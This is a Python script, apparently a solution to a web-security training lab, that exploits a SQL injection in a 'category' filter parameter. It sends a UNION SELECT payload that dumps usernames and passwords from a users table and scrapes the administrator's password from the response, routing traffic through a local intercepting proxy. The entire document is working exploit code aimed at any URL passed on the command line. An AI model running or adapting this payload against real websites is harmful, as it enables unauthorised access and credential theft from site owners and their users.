import requests
import sys
import urllib3
from bs4 import BeautifulSoup

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
    }
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



def exploit_sqli(url):
    print("(+) Dumbing usernames and passwords")
    sql_payload = "/filter?category=Accessories'+UNION+SELECT+username+,+password+FROM+users++--"
    response = requests.get (url+sql_payload,verify=False,proxies=proxies)
    if response.status_code == 200:
        print("(+) Found the administrator password")
        soup = BeautifulSoup(response.text,"html.parser")
        admin_password = soup.body.find(string="administrator").parent.findNext("td").contents[0]
        print(f"(+) Administrator password = '{admin_password}' ")
        return True
    return False



if __name__ == "__main__":
    try:
        url = sys.argv[1]
        if exploit_sqli(url):
            print("(+) Exploitation done sucessfully")
        else:
            print("(-) Something wen wrong")
    except RuntimeError:
        print(RuntimeError)
        print("(-) Usage: %s <url>" % sys.argv[0])
        print("(-) Example: %s https://www.example.com  " % sys.argv[0])
        sys.exit(-1)